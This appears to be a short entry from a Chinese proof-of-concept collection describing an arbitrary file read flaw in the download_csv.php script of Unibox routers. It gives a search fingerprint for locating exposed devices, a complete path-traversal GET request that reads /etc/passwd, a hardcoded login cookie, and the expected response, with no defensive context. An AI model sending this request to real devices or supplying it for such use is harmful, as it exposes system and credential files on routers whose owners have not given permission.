# Unibox路由器download_csv.php存在任意文件读取漏洞

- **系统**：Unibox　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="Unibox"`
- **请求**：`GET /tools/download_csv.php?download_file=../../../etc/passwd HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Cookie: user=unibox; pass=294a3d333d2f6b7e121594189fce9a72`
- **预期**：200　|　—